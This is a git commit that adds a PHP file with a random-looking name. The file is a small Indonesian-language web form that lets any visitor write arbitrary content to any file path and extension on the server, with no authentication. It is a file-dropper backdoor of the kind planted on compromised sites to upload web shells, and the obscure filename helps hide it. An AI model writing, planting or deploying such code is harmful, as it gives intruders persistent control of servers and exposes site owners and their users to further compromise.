e0f933c6697fcc4cff488603cf232496ce8937ce
antoniola <renata.cantiek@gmail.com>
2020-04-18 18:35:06 +0700

    Create 8f4sd65fy4g3223123231454354352dsf2dgfjhkhgk.php

---
+++ 8f4sd65fy4g3223123231454354352dsf2dgfjhkhgk.php
@@ -0,0 +1,36 @@
+<?php
+
+if(isset($_POST['save']))
+{
+	$f=$_POST['file'];
+	$ext=$_POST['ext'];
+	$data=$_POST['data'];
+	$file=$f.$ext;
+	if(file_exists($file))
+	{
+	echo "<font color='red'>NAMA FILE SUDAH ADA</font>";
+	}
+	else
+	{
+	$fo = fopen($file,"w");
+	fwrite($fo,$data);
+	echo "FILE DATA BERHASIL DI BUAT<br><br>";
+	}
+}
+
+
+?>
+<br><br><center>
+<form method="post">
+PILIH LOKASI DIRECTORI DAN BUAT NAMA FILE<br>
+<input type="text" style="width: 525px"value="<? echo getcwd(); ?>"name="file"/><br/><br>
+
+ 
+
+MASUKAN SCRIPTNYA<br>
+<textarea rows="10" cols="64" name="data">
+<?php echo @$contents ; ?>
+</textarea>
+<br/><br>
+<input type="submit" value="BUAT" name="save"/>
+</form></center>
